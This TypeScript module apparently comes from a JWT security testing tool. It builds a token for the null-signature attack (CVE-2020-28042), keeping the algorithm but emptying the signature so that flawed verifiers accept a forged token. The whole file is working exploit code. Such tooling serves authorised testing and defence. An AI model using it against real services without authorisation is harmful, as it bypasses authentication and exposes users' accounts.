import type { ParsedJWT, AttackResult } from "../types.js";
import { encodeUnsigned } from "../crypto/jwt.js";
import { nanoid } from "../util.js";

export function buildNullSigAttacks(parsed: ParsedJWT): AttackResult[] {
  // CVE-2020-28042: keep alg unchanged but empty the signature
  const signingInput = encodeUnsigned(parsed.header, parsed.payload);

  return [
    {
      id: nanoid(),
      technique: "nullSig",
      techniqueName: "Null Signature",
      description:
        "CVE-2020-28042: Retains the original algorithm but empties the signature. " +
        "Vulnerable implementations skip signature verification when the signature field is empty.",
      modifiedJWT: `${signingInput}.`,
      timestamp: Date.now(),
    },
  ];
}
